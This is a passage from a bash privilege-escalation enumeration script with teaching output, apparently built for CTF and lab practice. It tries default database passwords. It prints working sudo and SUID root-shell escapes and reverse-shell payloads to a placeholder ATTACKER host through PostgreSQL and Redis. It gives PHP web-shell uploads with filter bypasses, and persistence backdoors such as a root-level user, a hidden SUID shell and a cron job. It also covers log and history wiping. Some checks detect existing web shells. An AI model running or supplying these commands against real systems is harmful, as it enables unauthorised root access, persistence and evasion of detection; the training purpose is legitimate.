        if [ "$major" -eq 1 ] && [ "$minor" -eq 8 ] && [ "$patch" -lt 28 ]; then
            critical "Sudo vulnerable to CVE-2019-14287 - User ID bypass"
            vuln "sudo < 1.8.28 vulnerable"
            log ""
            teach "╔════════════════════════════════════════════════════════════╗"
            teach "║  CVE-2019-14287 - Sudo Runas User ID Bypass"
            teach "╚════════════════════════════════════════════════════════════╝"
            teach ""
            teach "WHAT IT IS:"
            teach "  A logic bug that lets you run commands as root even when the"
            teach "  sudoers file explicitly says you CAN'T run as root."
            teach ""
            teach "WHY IT EXISTS:"
            teach "  Sudo allows you to run commands as different users with -u flag."
            teach "  Example: sudo -u www-data whoami (runs as www-data)"
            teach ""
            teach "  In sudoers, you might see:"
            teach "  user ALL=(ALL, !root) /bin/bash"
            teach ""
            teach "  This means: 'user can run bash as ANYONE except root'"
            teach "  The !root is supposed to block running as root for safety."
            teach ""
            teach "THE BUG:"
            teach "  Sudo uses numeric user IDs internally (UID). Root is UID 0."
            teach "  When you specify -u#-1, sudo converts -1 to unsigned int."
            teach "  In programming: -1 as unsigned = 4294967295"
            teach "  Sudo then wraps this around and interprets it as UID 0 (root)!"
            teach ""
            teach "  It's like odometer rollback:"
            teach "  -1 → wraps around → becomes 0 (root)"
            teach ""
            teach "HOW TO EXPLOIT:"
            teach "  1. Check if you have Runas permissions:"
            teach "     sudo -l"
            teach "  2. Look for: (ALL, !root) or (ALL:ALL, !root)"
            teach "  3. Instead of 'sudo -u root bash' (blocked), run:"
            teach "     sudo -u#-1 /bin/bash"
            teach "  4. The -1 gets converted to UID 0 (root)"
            teach "  5. You get root shell"
            teach ""
            teach "EXAMPLE:"
            teach "  $ sudo -l"
            teach "  User bob may run the following commands:"
            teach "      (ALL, !root) /bin/bash"
            teach ""
            teach "  $ sudo -u root /bin/bash"
            teach "  Sorry, user bob is not allowed to execute '/bin/bash' as root"
            teach ""
            teach "  $ sudo -u#-1 /bin/bash"
            teach "  # whoami"
            teach "  root"
            teach ""
            teach "IMPACT: Bypass explicit !root restrictions in sudoers"
            log ""
        fi
        
        # CVE-2019-18634 - pwfeedback overflow (1.7.1 to 1.8.30)
        if [ "$major" -eq 1 ]; then
            if ([ "$minor" -eq 7 ] && [ "$patch" -ge 1 ]) || ([ "$minor" -eq 8 ] && [ "$patch" -le 30 ]); then
                warn "Sudo potentially vulnerable to CVE-2019-18634 - Buffer overflow"
                info "Requires pwfeedback enabled in sudoers (uncommon)"
                log ""
                teach "╔════════════════════════════════════════════════════════════╗"
                teach "║  CVE-2019-18634 - Password Feedback Buffer Overflow"
                teach "╚════════════════════════════════════════════════════════════╝"
                teach ""
                teach "WHAT IT IS:"
                teach "  When pwfeedback is enabled, sudo shows asterisks (*) as you"
                teach "  type your password. A buffer overflow in this feature allows"
                teach "  privilege escalation."
                teach ""
                teach "WHY IT EXISTS:"
                teach "  The pwfeedback feature displays * for each character typed."
                teach "  Sudo allocates a fixed-size buffer to store these asterisks."
                teach "  If you type more characters than the buffer can hold, it"
                teach "  overflows, potentially allowing code execution as root."
                teach ""
                teach "IMPORTANT: This is UNCOMMON"
                teach "  pwfeedback is disabled by default in most Linux distributions."
                teach "  It must be explicitly enabled in /etc/sudoers:"
                teach "  Defaults pwfeedback"
                teach ""
                teach "HOW TO CHECK IF EXPLOITABLE:"
                teach "  1. Check sudoers config:"
                teach "     sudo -l"
                teach "  2. Look for 'pwfeedback' in the output"
                teach "  3. Or check the file directly:"
                teach "     grep pwfeedback /etc/sudoers /etc/sudoers.d/*"
                teach ""
                teach "HOW TO EXPLOIT (if pwfeedback enabled):"
                teach "  1. Download exploit from exploit-db or GitHub"
                teach "  2. Compile it"
                teach "  3. Run it - exploit sends many characters to overflow buffer"
                teach ""
                teach "IMPACT: Local privilege escalation IF pwfeedback is enabled"
                log ""
            fi
        fi
        
        ok "Sudo version checked against known CVEs"
        log ""
        teach "═══════════════════════════════════════════════════════════════"
        teach "GENERAL SUDO SECURITY TIPS:"
        teach "═══════════════════════════════════════════════════════════════"
        teach ""
        teach "Why sudo is a common target:"
        teach "  • Runs with root privileges by design"
        teach "  • Complex codebase (150,000+ lines of C)"
        teach "  • Handles authentication, parsing, environment variables"
        teach "  • Backward compatibility = old code paths still exist"
        teach "  • Written in C = memory safety issues possible"
        teach ""
        teach "How to find sudo exploits:"
        teach "  1. Check version: sudo -V | head -1"
        teach "  2. Search exploit-db: searchsploit sudo [version]"
        teach "  3. GitHub: Search 'sudo CVE-[year]'"
        teach "  4. Check sudo permissions: sudo -l"
        teach ""
        teach "Defense (as admin):"
        teach "  • Keep sudo updated (sudo --version)"
        teach "  • Principle of least privilege (specific commands, not ALL)"
        teach "  • Avoid NOPASSWD where possible"
        teach "  • Monitor sudo logs: /var/log/auth.log"
        log ""
    else
        info "sudo not installed"
    fi
}
enum_sudo2() {
    log "${COLOR_PURPLE}[SUDO PERMISSIONS]${COLOR_RESET}"
    if sudo -l 2>&1 | grep -v "not allowed"; then
        critical "Sudo access confirmed"
        return 0
    else
        warn "No sudo access"
        return 1
    fi
}
# === SUID BINARY ANALYSIS ===
enum_suid() {
    section "SUID BINARY ANALYSIS"
    
    explain_concept "SUID Bit" \
        "SUID (Set User ID) allows a program to run with the file owner's privileges. If owner is root, program runs as root regardless of who executes it." \
        "Legitimate use: /usr/bin/passwd needs root to modify /etc/shadow. Dangerous: Custom SUID binaries may have vulnerabilities, call other programs unsafely, or have shell escape features." \
        "Attack vectors:\n  1. Binary spawns a shell directly\n  2. Binary calls other programs without absolute paths (PATH hijacking)\n  3. Binary has buffer overflow or other memory corruption\n  4. Binary has command injection vulnerability"
    
    # Known legitimate SUID binaries (expanded for modern systems)
    local legit_suid=(
        "/usr/bin/passwd" "/usr/bin/sudo" "/usr/bin/su"
        "/usr/bin/mount" "/usr/bin/umount" "/usr/bin/chsh"
        "/usr/bin/chfn" "/usr/bin/gpasswd" "/usr/bin/newgrp"
        "/bin/ping" "/bin/ping6" "/usr/bin/pkexec"
        "/usr/bin/fusermount" "/usr/lib/openssh/ssh-keysign"
        "/bin/su" "/bin/mount" "/bin/umount" "/bin/fusermount"
        "/bin/ntfs-3g" "/usr/bin/newuidmap" "/usr/bin/newgidmap"
        "/usr/bin/at" "/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic"
        "/usr/lib/dbus-1.0/dbus-daemon-launch-helper"
        "/usr/lib/snapd/snap-confine"
        "/usr/lib/policykit-1/polkit-agent-helper-1"
        "/usr/lib/eject/dmcrypt-get-device"
        "/usr/bin/fusermount3" "/usr/bin/ntfs-3g"
        "/usr/lib/chromium/chrome-sandbox" "/usr/share/codium/chrome-sandbox"
        "/usr/lib/xorg/Xorg.wrap" "/usr/sbin/pppd" "/usr/sbin/exim4"
        "/usr/libexec/xscreensaver/xscreensaver-auth"
    )
    
    local found_interesting=0
    
    find / \( -path "*/containers/storage/*" -o -path /proc -o -path /sys -o -path /dev \) -prune -o -perm -4000 -type f -print 2>/dev/null | while read suid_bin; do

        local is_legit=0
        
        for legit in "${legit_suid[@]}"; do
            [ "$suid_bin" = "$legit" ] && is_legit=1 && break
        done
        
        if [ $is_legit -eq 0 ]; then
            vuln "Non-standard SUID binary: $suid_bin"
            found_interesting=1
            
            local owner=$(stat -c %U "$suid_bin" 2>/dev/null)
            local perms=$(stat -c %a "$suid_bin" 2>/dev/null)
            
            log "    Owner: $owner | Permissions: $perms"
            
            # Analyze what it does
            local file_type=$(file "$suid_bin" 2>/dev/null)
            if echo "$file_type" | grep -q "script"; then
                warn "    This is a script with SUID - scripts ignore SUID on most systems"
                teach "    However, check if it calls other binaries you can manipulate"
            fi
            
            # Check if it's a known exploitable binary
            local basename=$(basename "$suid_bin")
            case $basename in
                nmap)
                    critical "SUID nmap - Instant root: nmap --interactive then !sh"
                    teach "  → nmap --interactive → !sh (older versions)"
                    ;;
                vim)
                    critical "SUID vim - Instant root: vim -c ':!/bin/sh -p'"
                    teach "  → vim -c ':!/bin/sh -p'"
                    ;;
                vi)
                    critical "SUID vi - Instant root: vi -c ':!/bin/sh -p'"
                    teach "  → vi -c ':!/bin/sh -p'"
                    ;;
                nano)
                    teach "  → nano, then ^R^X reset; sh -p"
                    ;;
                find)
                    critical "SUID find - Instant root: find . -exec /bin/sh -p \\; -quit"
                    teach "  → find . -exec /bin/sh -p \\; -quit"
                    ;;
                python*|python)
                    critical "SUID python - Instant root: python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
                    teach "  → python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
                    ;;
                perl)
                    critical "SUID perl - Instant root: perl -e 'exec \"/bin/sh\", \"-p\";'"
                    teach "  → perl -e 'exec \"/bin/sh\", \"-p\";'"
                    ;;
                ruby)
                    critical "SUID ruby - Instant root: ruby -e 'exec \"/bin/sh\", \"-p\"'"
                    teach "  → ruby -e 'exec \"/bin/sh\", \"-p\"'"
                    ;;
                node)
                    critical "SUID node - Instant root: node -e 'require(\"child_process\").spawn(\"/bin/sh\", [\"-p\"], {stdio: [0,1,2]})'"
                    teach "  → node -e 'require(\"child_process\").spawn(\"/bin/sh\", [\"-p\"], {stdio: [0,1,2]})'"
                    ;;
                bash)
                    critical "SUID bash - Instant root: bash -p"
                    teach "  → bash -p"
                    ;;
                sh)
                    critical "SUID sh - Instant root: sh -p"
                    teach "  → sh -p"
                    ;;
                zsh)
                    critical "SUID zsh - Instant root: zsh"
                    teach "  → zsh"
                    ;;
                awk)
                    critical "SUID awk - Instant root: awk 'BEGIN {system(\"/bin/sh -p\")}'"
                    teach "  → awk 'BEGIN {system(\"/bin/sh -p\")}'"
                    ;;
                less)
                    critical "SUID less - Instant root: less /etc/profile then !sh"
                    teach "  → less /etc/profile, then !sh"
                    ;;
                more)
                    critical "SUID more - Instant root: more /etc/profile then !sh"
                    teach "  → more /etc/profile, then !sh"
                    ;;
                systemctl)
                    critical "SUID systemctl - Create malicious service"
                    teach "  → echo '[Service]' > /tmp/root.service"
                    teach "  → echo 'ExecStart=/bin/sh -c \"chmod +s /bin/bash\"' >> /tmp/root.service"
                    teach "  → systemctl link /tmp/root.service"
                    teach "  → systemctl start root"
                    ;;
                tail)
                    teach "  → tail -c1G /etc/shadow (reads file)"
                    ;;
                strace)
                    teach "  → strace -o /dev/null /bin/sh -p"
                    ;;
                env)
                    critical "SUID env - Execute shell: env /bin/sh -p"
                    teach "  → env /bin/sh -p"
                    ;;
                cut)
                    teach "  → cut -d: -f1 /etc/shadow (reads file)"
                    ;;
                diff)
                    teach "  → diff --line-format=%L /dev/null /etc/shadow"
                    ;;
                php)
                    critical "SUID php - Execute commands: php -r 'pcntl_exec(\"/bin/sh\", [\"-p\"]);'"
                    teach "  → php -r 'pcntl_exec(\"/bin/sh\", [\"-p\"]);'"
                    ;;
                *)
                    teach "  → Analysis steps:"
                    teach "      strings $suid_bin | grep -E 'system|exec|popen'"
                    teach "      ltrace $suid_bin 2>&1 | grep -E 'system|exec'"
                    teach "      Check GTFOBins for: $basename"
                    ;;
            esac
        fi
    done
    
    [ $found_interesting -eq 0 ] && ok "Only standard SUID binaries found"
}

# === SGID BINARIES ===
enum_sgid() {
    section "SGID BINARY ANALYSIS"
    
    explain_concept "SGID Bit" \
        "SGID (Set Group ID) is like SUID but for groups. The program runs with the file's group privileges." \
        "Less common than SUID for privilege escalation, but if SGID binary is in 'shadow' or 'docker' group, it can be exploited." \
        "Look for SGID binaries in privileged groups, then analyze like SUID binaries."
    
        find / \( -path "*/containers/storage/*" -o -path /proc -o -path /sys -o -path /dev \) -prune -o -perm -2000 -type f -print 2>/dev/null | head -20 | while read sgid_bin; do
        local group=$(stat -c %G "$sgid_bin" 2>/dev/null)
        case $group in
            shadow|docker|disk|sudo)
                vuln "SGID binary in privileged group '$group': $sgid_bin"
                teach "  This binary runs with $group privileges"
                ;;
        esac
    done
}

# ═══════════════════════════════════════════════════
# EXTENDED MODULES (--extended flag)
# ═══════════════════════════════════════════════════

# === DATABASE ENUMERATION ===
enum_databases() {
    [ $EXTENDED -eq 0 ] && return
    
    section "DATABASE ENUMERATION"
    
    explain_concept "Database Privilege Escalation" \
        "Databases often run as root or privileged users. Weak credentials or UDF exploits can lead to command execution." \
        "MySQL/PostgreSQL allow file operations and command execution via User Defined Functions or built-in features. MariaDB/MySQL running as root + FILE privilege = read/write any file. PostgreSQL COPY FROM/TO can read/write files." \
        "Attack paths:\n  • Default credentials (root:root, root:password)\n  • Credentials in config files\n  • UDF exploitation for MySQL\n  • COPY FROM PROGRAM for PostgreSQL\n  • NoSQL injection for MongoDB"
    
    # Check for MySQL
    if command -v mysql >/dev/null 2>&1; then
        info "MySQL client is installed"
        
        # Try common credential combinations
        local mysql_creds=("root:" "root:root" "root:password" "root:toor")
        for cred in "${mysql_creds[@]}"; do
            local user=$(echo "$cred" | cut -d: -f1)
            local pass=$(echo "$cred" | cut -d: -f2)
            
            if [ -z "$pass" ]; then
                if mysql -u"$user" -e "SELECT 1" 2>/dev/null | grep -q "1"; then
                    critical "MySQL root access with NO PASSWORD - Instant privilege escalation possible"
                    vuln "MySQL accessible with no password: $user"
                    teach "Exploitation:"
                    teach "  mysql -u$user -e 'SELECT LOAD_FILE(\"/etc/shadow\")'"
                    teach "  Or use UDF to execute commands if running as root"
                fi
            else
                if mysql -u"$user" -p"$pass" -e "SELECT 1" 2>/dev/null | grep -q "1"; then
                    critical "MySQL root access with default password: $user:$pass"
                    vuln "MySQL accessible with default password: $user:$pass"
                fi
            fi
        done
        
        # Check for socket
        if [ -S /var/run/mysqld/mysqld.sock ]; then
            info "MySQL socket found at /var/run/mysqld/mysqld.sock"
            if [ -w /var/run/mysqld/mysqld.sock ]; then
                critical "MySQL socket is WRITABLE - Connect without credentials"
                vuln "MySQL socket is WRITABLE!"
                teach "Connect without credentials if file permissions allow"
            fi
        fi
    fi
    
    # Check for PostgreSQL
    if command -v psql >/dev/null 2>&1; then
        info "PostgreSQL client is installed"
        
        # Try connection
        if psql -U postgres -c "SELECT 1" 2>/dev/null | grep -q "1"; then
            critical "PostgreSQL accessible as postgres - Command execution via COPY TO PROGRAM"
            vuln "PostgreSQL accessible as postgres user"
            teach "PostgreSQL exploitation:"
            teach "  COPY (SELECT '') TO PROGRAM 'bash -c \"bash -i >& /dev/tcp/ATTACKER/PORT 0>&1\"'"
            teach "  Or read files: CREATE TABLE temp(t TEXT); COPY temp FROM '/etc/passwd';"
        fi
    fi
    
    # Check for MongoDB
    if command -v mongo >/dev/null 2>&1 || command -v mongosh >/dev/null 2>&1; then
        info "MongoDB client is installed"
        warn "MongoDB often runs without authentication by default"
        teach "Try: mongo --eval 'db.version()'"
        teach "Then enumerate databases and collections"
    fi
    
    # Check for Redis
    if command -v redis-cli >/dev/null 2>&1; then
        info "Redis client is installed"
        if redis-cli ping 2>/dev/null | grep -q "PONG"; then
            critical "Redis accessible without auth - Write cron jobs or SSH keys"
            vuln "Redis is accessible without authentication!"
            explain_concept "Redis Exploitation" \
                "Redis is an in-memory database often used for caching. Unauthenticated access allows arbitrary command execution." \
                "Redis CONFIG SET allows changing server configuration, including setting the working directory and writing files. You can write SSH keys or cron jobs." \
                "Exploitation:\n  redis-cli config set dir /var/spool/cron/\n  redis-cli config set dbfilename root\n  redis-cli set x '\\n* * * * * /bin/bash -i >& /dev/tcp/ATTACKER/PORT 0>&1\\n'\n  redis-cli save"
        fi
    fi
}

# === WEB APPLICATION ENUMERATION ===
# === ENHANCED WEB APPLICATION ENUMERATION ===
# === ENHANCED WEB APPLICATION ENUMERATION ===
enum_web() {
    [ $EXTENDED -eq 0 ] && return
    
    section "WEB APPLICATION ENUMERATION"
    
    explain_concept "Web Application Attacks" \
        "Web applications often store credentials, have writable directories, or run with elevated privileges." \
        "Common issues: hardcoded credentials in config files, writable web roots allowing shell upload, database credentials, API tokens, LFI/RFI vulnerabilities, existing backdoors from previous compromises." \
        "Where to look:\n  • /var/www/html - Default web root\n  • /var/www - Alternative location\n  • /opt/* - Custom applications\n  • Look for: config.php, .env, wp-config.php, database.yml\n  • Upload directories\n  • Existing web shells"
    
    # Check common web roots
    local web_roots=("/var/www/html" "/var/www" "/usr/share/nginx/html" "/opt" "/srv/www")
    local checked_dirs=()
    
    for webroot in "${web_roots[@]}"; do
        # Skip if already checked this or a parent
        local skip=0
        for checked in "${checked_dirs[@]}"; do
            if [[ "$webroot" == "$checked"* ]]; then
                skip=1
                break
            fi
        done
        [ $skip -eq 1 ] && continue
        
        if [ -d "$webroot" ]; then
            info "Found web directory: $webroot"
            checked_dirs+=("$webroot")
            
            # === CHECK 1: Writable Web Root ===
            if [ -w "$webroot" ]; then
                critical "Web root WRITABLE - Upload shell for remote code execution"
                vuln "Web root is WRITABLE: $webroot"
                explain_concept "Writable Web Root Exploitation" \
                    "If you can write to the web server's document root, you can upload a web shell and execute commands through the web browser." \
                    "Web servers execute scripts in their document root. If writable, upload PHP/JSP/ASPX shell. Web server process (www-data, apache, nginx) becomes your execution context." \
                    "Exploitation:\n  1. Create shell: echo '<?php system(\$_GET[\"cmd\"]); ?>' > $webroot/shell.php\n  2. Make it hidden: echo '<?php system(\$_GET[\"c\"]); ?>' > $webroot/.shell.php\n  3. Access: curl http://localhost/shell.php?cmd=id\n  4. Upgrade to reverse shell from there"
                
                teach "PHP shell upload:"
                teach "  echo '<?php system(\$_GET[\"cmd\"]); ?>' > $webroot/shell.php"
                teach "  curl http://localhost/shell.php?cmd=whoami"
                teach ""
                teach "Or hidden shell:"
                teach "  echo '<?php eval(\$_POST[\"x\"]); ?>' > $webroot/.config.php"
            fi
            
            # === CHECK 2: Upload Directories ===
            info "Checking for upload directories..."
            for upload_dir in "uploads" "upload" "files" "media" "assets" "images" "attachments" "documents"; do
                local upload_path="$webroot/$upload_dir"
                if [ -d "$upload_path" ]; then
                    info "  Found upload directory: $upload_path"
                    
                    if [ -w "$upload_path" ]; then
                        critical "Upload directory WRITABLE: $upload_path"
                        vuln "Writable upload directory: $upload_path"
                        
                        # Check if PHP execution is enabled in this directory
                        if [ -f "$upload_path/../.htaccess" ]; then
                            if grep -iE "php_flag|php_admin|AddHandler|SetHandler" "$upload_path/../.htaccess" 2>/dev/null | grep -q "."; then
                                info "  .htaccess found - check if PHP execution is restricted"
                            fi
                        fi
                        
                        teach "  Upload techniques:"
                        teach "    1. Direct: echo '<?php system(\$_GET[\"c\"]); ?>' > $upload_path/shell.php"
                        teach "    2. If .php blocked, try: .php3, .php4, .php5, .phtml, .phar"
                        teach "    3. Double extension: shell.php.jpg (may bypass filters)"
                        teach "    4. Null byte: shell.php%00.jpg (older PHP versions)"
                        teach "    5. .htaccess upload to enable PHP: echo 'AddType application/x-httpd-php .jpg' > $upload_path/.htaccess"
                    fi
                    
                    # Check for existing suspicious files
                    find "$upload_path" -maxdepth 2 -type f \( -name "*.php" -o -name "*.jsp" -o -name "*.aspx" -o -name "shell.*" -o -name "c99.*" -o -name "r57.*" \) 2>/dev/null | while read suspicious; do
                        warn "  Suspicious file in uploads: $suspicious"
                        if grep -iq "system\|exec\|shell_exec\|passthru\|eval" "$suspicious" 2>/dev/null; then
                            critical "  Existing web shell detected: $suspicious"
                            vuln "Existing web shell found: $suspicious"
                        fi
                    done
                fi
            done
            
            # === CHECK 3: Configuration Files ===
            info "Searching for configuration files..."
            find "$webroot" -maxdepth 3 -type f \( -name "*.conf" -o -name "*.config" -o -name "*config*.php" -o -name ".env" -o -name "*.yml" -o -name "*.yaml" -o -name "*.ini" \) 2>/dev/null | \
            grep -vE "sample|example|setup-config|default-|node_modules|vendor" | head -15 | while read config; do
                if [ -r "$config" ]; then
                    info "  Found config: $config"
                    
                    # Check for credentials with better patterns
                    if grep -iE "(password|passwd|pwd|secret|token|api[_-]?key)[[:space:]]*[=:'\"]" "$config" 2>/dev/null | \
                       grep -vE "^[[:space:]]*[#;]|example|sample|your_|changeme|<password>|password_here" | head -3 | grep -q "."; then
                        critical "Config contains credentials: $config"
                        vuln "Configuration file with credentials: $config"
                        grep -iE "(password|passwd|secret|token|api[_-]?key)[[:space:]]*[=:'\"]" "$config" 2>/dev/null | \
                        grep -vE "^[[:space:]]*[#;]|example" | head -3 | while read line; do
                            log "    $line"
                        done
                    fi
                    
                    # Check if writable
                    if [ -w "$config" ]; then
                        vuln "Config file is WRITABLE: $config"
                        teach "  Modify to add backdoor credentials or change settings"
                    fi
                fi
            done
            
            # === CHECK 4: WordPress Specific ===
            if [ -f "$webroot/wp-config.php" ]; then
                vuln "WordPress installation: $webroot"
                teach "WordPress enumeration tips:"
                teach "  • Check wp-config.php for DB credentials"
                teach "  • Look for wp-config.php.bak, wp-config.php~, wp-config.old"
                teach "  • Enumerate users: curl http://site/wp-json/wp/v2/users"
                teach "  • Check plugins for vulnerabilities: ls wp-content/plugins/"
                teach "  • xmlrpc.php for brute force amplification"
                
                # Check for WordPress backups
                find "$webroot" -maxdepth 1 -type f \( -name "wp-config*.bak" -o -name "wp-config*.old" -o -name "wp-config*~" -o -name "wp-config*.save" \) 2>/dev/null | while read backup; do
                    if [ -r "$backup" ]; then
                        critical "WordPress config backup readable: $backup"
                        vuln "WordPress backup file: $backup"
                    fi
                done
            fi
            
            # === CHECK 5: Framework Detection ===
            info "Detecting web frameworks..."
            
            # Laravel
            if [ -f "$webroot/.env" ] || [ -d "$webroot/storage" ]; then
                info "  Laravel framework detected"
                if [ -r "$webroot/.env" ]; then
                    critical "Laravel .env file readable: $webroot/.env"
                    vuln "Laravel .env exposed"
                fi
            fi
            
            # Django
            if [ -f "$webroot/manage.py" ] || find "$webroot" -name "settings.py" 2>/dev/null | grep -q "."; then
                info "  Django framework detected"
                find "$webroot" -name "settings.py" -readable 2>/dev/null | head -3 | while read settings; do
                    info "  Django settings: $settings"
                    if grep -E "SECRET_KEY|DATABASE|PASSWORD" "$settings" 2>/dev/null | grep -q "."; then
                        vuln "Django settings contain credentials: $settings"
                    fi
                done
            fi
            
            # Node.js/Express
            if [ -f "$webroot/package.json" ]; then
                info "  Node.js application detected"
                if [ -r "$webroot/.env" ]; then
                    critical "Node.js .env file readable"
                fi
            fi
            
            # Ruby on Rails
            if [ -d "$webroot/config" ] && [ -f "$webroot/config.ru" ]; then
                info "  Ruby on Rails detected"
                if [ -r "$webroot/config/database.yml" ]; then
                    critical "Rails database.yml readable: $webroot/config/database.yml"
                    vuln "Rails database config exposed"
                fi
            fi
            
            # === CHECK 6: .htaccess Files ===
            info "Checking for .htaccess files..."
            find "$webroot" -maxdepth 3 -name ".htaccess" -type f 2>/dev/null | while read htaccess; do
                if [ -r "$htaccess" ]; then
                    info "  Found .htaccess: $htaccess"
                    
                    if [ -w "$htaccess" ]; then
                        critical ".htaccess is WRITABLE: $htaccess"
                        vuln "Writable .htaccess: $htaccess"
                        teach "  Enable PHP in images: echo 'AddType application/x-httpd-php .jpg' >> $htaccess"
                        teach "  Bypass auth: echo 'Require all granted' >> $htaccess"
                    fi
                    
                    # Check for auth directives
                    if grep -qE "AuthUserFile|Require valid-user" "$htaccess" 2>/dev/null; then
                        info "  Protected by HTTP auth"
                        
                        # Try to find .htpasswd
                        local htpasswd=$(grep "AuthUserFile" "$htaccess" 2>/dev/null | awk '{print $2}')
                        if [ -n "$htpasswd" ] && [ -r "$htpasswd" ]; then
                            critical "Password file readable: $htpasswd"
                            vuln "HTTP auth password file exposed: $htpasswd"
                            teach "  Crack with: john $htpasswd"
                        fi
                    fi
                fi
            done
            
            # === CHECK 7: Log Files ===
            info "Checking web server logs for credentials in URLs..."
            for logfile in "$webroot/../logs/access.log" "/var/log/apache2/access.log" "/var/log/nginx/access.log"; do
                if [ -r "$logfile" ]; then
                    # Look for credentials passed in GET parameters
                    if grep -iE "password=|passwd=|pwd=|token=|api_key=" "$logfile" 2>/dev/null | tail -5 | grep -q "."; then
                        warn "Access log contains credentials in URLs: $logfile"
                        grep -iE "password=|passwd=|pwd=|token=" "$logfile" 2>/dev/null | tail -3 | while read line; do
                            log "  $line"
                        done
                        teach "  Credentials submitted via GET are logged!"
                    fi
                fi
            done
            
            # === CHECK 8: Session Files ===
            for session_dir in "$webroot/../sessions" "/var/lib/php/sessions" "/tmp"; do
                if [ -d "$session_dir" ]; then
                    local session_count=$(find "$session_dir" -name "sess_*" -type f 2>/dev/null | wc -l)
                    if [ $session_count -gt 0 ]; then
                        info "Found $session_count PHP session files in: $session_dir"
                        
                        if [ -r "$session_dir" ]; then
                            # Check if any sessions contain interesting data
                            find "$session_dir" -name "sess_*" -type f -readable 2>/dev/null | head -3 | while read session; do
                                if grep -iE "admin|user|password|token" "$session" 2>/dev/null | grep -q "."; then
                                    warn "  Session with potential credentials: $session"
                                fi
                            done
                        fi
                    fi
                fi
            done
            
            # === CHECK 9: Existing Web Shells ===
            info "Scanning for existing web shells..."
            local shell_patterns="c99|r57|b374k|wso|shell|cmd|eval\(|base64_decode|system\(|exec\(|passthru\("
            
            find "$webroot" -maxdepth 3 -type f \( -name "*.php" -o -name "*.phtml" \) 2>/dev/null | while read phpfile; do
                # Check file for shell signatures
                if grep -iE "$shell_patterns" "$phpfile" 2>/dev/null | head -1 | grep -q "."; then
                    # Avoid false positives from legitimate code
                    local suspicious_count=$(grep -icE "system\(|exec\(|shell_exec\(|passthru\(|eval\(" "$phpfile" 2>/dev/null)
                    if [ $suspicious_count -gt 2 ]; then
                        critical "Potential web shell: $phpfile (confidence: high)"
                        vuln "Possible existing web shell: $phpfile"
                        teach "  Analyze: cat $phpfile | head -20"
                    fi
                fi
            done
        fi
    done
    
    # === CHECK 10: Running Web Server Detection ===
    if netstat -tuln 2>/dev/null | grep -qE ":80 |:443 |:8080 "; then
        info "Web server is listening on common ports"
        
        # Identify web server type
        if ps aux | grep -iE "apache2|httpd" | grep -v grep | grep -q "."; then
            info "Apache web server detected"
            teach "Apache exploitation tips:"
            teach "  • Check for writable .htaccess"
            teach "  • Look for mod_cgi with writable cgi-bin"
            teach "  • Check Apache version for CVEs"
        fi
        
        if ps aux | grep -i nginx | grep -v grep | grep -q "."; then
            info "Nginx web server detected"
            teach "Nginx exploitation tips:"
            teach "  • Check nginx.conf for misconfigurations"
            teach "  • Look for path traversal via alias directive"
            teach "  • Check for writable sites-enabled configs"
        fi
        
        teach "\nGeneral web exploitation:"
        teach "  • LFI: /index.php?page=../../../../etc/passwd"
        teach "  • RFI: /index.php?page=http://attacker/shell.txt"
        teach "  • Command injection: /script.php?file=test;whoami"
        teach "  • SQL injection in parameters"
    fi
    
    # === Summary ===
    log ""
    info "Web application enumeration complete"
    teach "Key web attack vectors:"
    teach "  1. Writable web root = direct shell upload"
    teach "  2. Writable upload directories with PHP execution"
    teach "  3. Config files with DB credentials"
    teach "  4. Existing web shells from previous compromise"
    teach "  5. Framework-specific vulnerabilities"
}
# === POST-EXPLOITATION ===
enum_post_exploit() {
    [ $EXTENDED -eq 0 ] && return
    
    section "POST-EXPLOITATION OPPORTUNITIES"
    
    explain_concept "Post-Exploitation" \
        "After gaining initial access, establish persistence, gather credentials, and prepare for lateral movement." \
        "You might lose access (reboot, detection, session timeout). Persistence ensures you can return. Credentials enable lateral movement to other systems. Evidence should be minimized." \
        "Techniques:\n  • Backdoor accounts\n  • SSH key injection\n  • SUID shells\n  • Cron jobs\n  • Systemd services"
    
    # Check if we're root (for post-exploit suggestions)
    if [ $EUID -eq 0 ]; then
        info "Running as ROOT - post-exploitation options available"
        
        teach "Persistence techniques now available:"
        teach "  1. Add SSH key: echo 'YOUR_KEY' >> /root/.ssh/authorized_keys"
        teach "  2. Create SUID shell: cp /bin/bash /tmp/.hidden; chmod 4755 /tmp/.hidden"
        teach "  3. Add backdoor user: echo 'backdoor:\$1\$xyz\$HASH:0:0::/root:/bin/bash' >> /etc/passwd"
        teach "  4. Cron backdoor: echo '* * * * * root /tmp/.backdoor' >> /etc/crontab"
        
        teach "\nCredential harvesting:"
        teach "  • Dump /etc/shadow for offline cracking"
        teach "  • Extract SSH keys from /home/*/.ssh/"
        teach "  • Check browser saved passwords if GUI present"
        teach "  • Dump process memory for credentials: strings /proc/*/environ"
        
        teach "\nAnti-forensics:"
        teach "  • Clear logs: echo '' > /var/log/auth.log"
        teach "  • Clear history: history -c; rm ~/.bash_history"
        teach "  • Remove artifacts: rm /tmp/exploit*"
        
    else
        info "Not root yet - focus on privilege escalation first"
    fi
    
    # Network reconnaissance for lateral movement
    info "Internal network reconnaissance:"
    
    # Check for other hosts in ARP cache
    if command -v arp >/dev/null 2>&1; then
        local hosts=$(arp -a 2>/dev/null | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | sort -u | wc -l)
        if [ $hosts -gt 1 ]; then
            info "Found $hosts hosts in ARP cache"
            teach "Potential targets for lateral movement"
        fi
    fi
    
    # Check for SSH known_hosts
    find /home -name "known_hosts" 2>/dev/null | while read khosts; do
        if [ -r "$khosts" ]; then
            info "SSH known_hosts found: $khosts"
            teach "Contains previously accessed hosts - potential lateral movement targets"
        fi
    done
}

# === CTF FLAG HUNTING ===
enum_ctf_flags() {
    [ $EXTENDED -eq 0 ] && return
    [ $SHOW_FLAGS -eq 0 ] && return
    
    section "CTF FLAG HUNTING"
    
    teach "Looking for common CTF flag patterns and locations..."
    
    # Common flag patterns
    local flag_patterns=(
        "flag{.*}"
        "HTB{.*}"
        "THM{.*}"
        "CTF{.*}"
        "FLAG{.*}"
    )
    
    info "Checking common flag file locations:"
    
    # Root flags
    find /root -maxdepth 1 -name "root.txt" -o -name "flag.txt" -o -name "proof.txt" 2>/dev/null | while read flagfile; do
        if [ -r "$flagfile" ]; then
            ctf_flag "ROOT FLAG READABLE: $flagfile"
            vuln "ROOT FLAG FOUND: $flagfile"
            
            if [ $SHOW_FLAGS -eq 1 ]; then
